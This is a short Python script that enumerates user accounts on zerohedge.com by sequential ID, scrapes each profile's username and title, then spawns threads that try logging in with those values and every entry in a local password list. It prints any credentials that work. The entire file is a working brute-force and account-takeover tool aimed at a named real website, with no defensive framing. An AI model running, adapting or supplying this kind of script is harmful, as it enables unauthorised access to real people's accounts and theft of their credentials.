import requests
import sys
import threading
import time

def output(entry):
	for i in range(len(entry)):
		sys.stdout.write(entry[i] + " " * ([8, 32, 32, 8][i] - len(entry[i])))
#
# output the given entry with a configured column width

	sys.stdout.write("\n")

def attempt(entry, passwords):
	try:
		for item in [entry[1], entry[2]] + passwords:
			data = {"form_id": "user_login", "name": entry[1], "pass": item}

			response = requests.post("http://zerohedge.com/user/", data).text
#
# submit a POST request with the entry information for each password

			if "/user/password" not in response:
				output(entry + [item])

				exit()
#
# output the information and exit the program if the login is successful

	except Exception as error:
		time.sleep(1)
#
# sleep for one second if an error is returned

def evaluate(number):
	entry = [number]

	try:
		response = requests.get("http://zerohedge.com/user/" + number).text
#
# request information from the user page to fill the entry

		if "Page Not Found" not in response:
			entry.append(response[response.index("canonical") + 48:response.index("og:url") - 21])
#
# append the username to the entry

			entry.append(response[response.index("<title>") + 7:response.index(" | Zero Hedge")])
#
# append the title to the entry

	except Exception as error:
		pass
	
	return entry

def main(passwords):
	output(["Number", "Username", "Title", "Password"])
#
# output the column headers

	number = 0

	while True:
		entry = evaluate(str(number))
#
# evaluate the user identification number

		if len(entry) > 1:
			threading.Thread(target=attempt, args=(entry, passwords)).start()
#
# begin a thread to attempt the entry with the given password list

		number += 1

if __name__ == "__main__":
	try:
		file = open("passwords.txt", "r")

		passwords = filter(None, file.read().split("\n"))

		main(passwords)

	except KeyboardInterrupt:
		sys.stdout.write("\nInterrupted.\n")

	finally:
		file.close()
